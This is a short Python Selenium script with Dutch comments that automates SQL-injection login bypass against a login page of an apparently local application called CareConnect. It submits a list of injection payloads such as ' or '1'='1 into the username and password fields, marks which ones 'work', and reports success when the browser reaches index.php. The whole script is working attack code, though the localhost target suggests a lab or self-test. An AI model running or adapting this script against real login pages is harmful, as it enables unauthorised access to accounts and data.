from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
url = "http://localhost/CareConnect/login.php"

# 🔹 Alleen SQL-achtige payloads
payloads = [
    # ❌ correct opgebouwd maar FALSE → werkt niet
    ("admin", "foo' or '1'='2"),
    ("admin", "' or 'a'='b"),
    ("' or '1'='2", "' or '1'='2"),
    ("admin", "' AND '1'='2"),
    ("' AND '1'='2", "' AND '1'='2"),

    # ❌ logisch correct maar geen comment → vaak faalt
    ("admin", "' or '1'='1"),
    ("admin", "' or ''='"),

    # ✅ jouw werkende payloads
    ("admin", "foo' or '1'='1"),
    ("admin", "' or ''='"),
    ("' or '1'='1", "' or '1'='1"),
]

for username, password in payloads:
    driver.get(url)
    time.sleep(1)

    print(f"Test: {username} / {password}")

    driver.find_element(By.ID, "username").clear()
    driver.find_element(By.ID, "password").clear()

    driver.find_element(By.ID, "username").send_keys(username)
    driver.find_element(By.ID, "password").send_keys(password)

    driver.find_element(By.ID, "loginBtn").click()
    time.sleep(2)

    if "index.php" in driver.current_url:
        print("🔥 SUCCESS (SQL injectie werkt)")
        break
    else:
        print("❌ Geen succes")

driver.quit()